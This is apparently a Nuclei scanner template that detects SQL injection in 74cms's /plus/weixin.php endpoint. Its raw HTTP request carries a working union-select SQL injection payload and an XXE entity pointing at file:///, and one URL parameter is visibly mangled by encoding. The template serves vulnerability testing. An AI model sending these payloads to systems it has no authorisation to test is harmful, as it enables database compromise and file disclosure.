id: 74cms-sqli-weixin
info:
  name: 74cms SQL Injection in Weixin Endpoint
  author: ProjectDiscoveryAI
  severity: medium
  tags: sql-injection
  description: |
    74cms Weixin endpoint is vulnerable to SQL injection allowing an attacker to execute arbitrary SQL queries.

variables:
  rand: "{{rand_int(10000, 21000)}}"

http:
  - raw:
      - |
        POST /plus/weixin.php?signature=da39a3ee5e6b4b0d3255bfef95601890afd80709\xc3\x97tamp=&nonce= HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml

        <?xml version="1.0" encoding="utf-8"?>
        <!DOCTYPE copyright [<!ENTITY test SYSTEM "file:///"]>
        <xml>
          <ToUserName>&test;</ToUserName>
          <FromUserName>1111</FromUserName>
          <MsgType>123</MsgType>
          <FuncFlag>3</FuncFlag>
          <Content>1%' union select md5({{rand}})#</Content>
        </xml>
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "{{md5(rand)}}"
      - type: status
        status:
          - 200
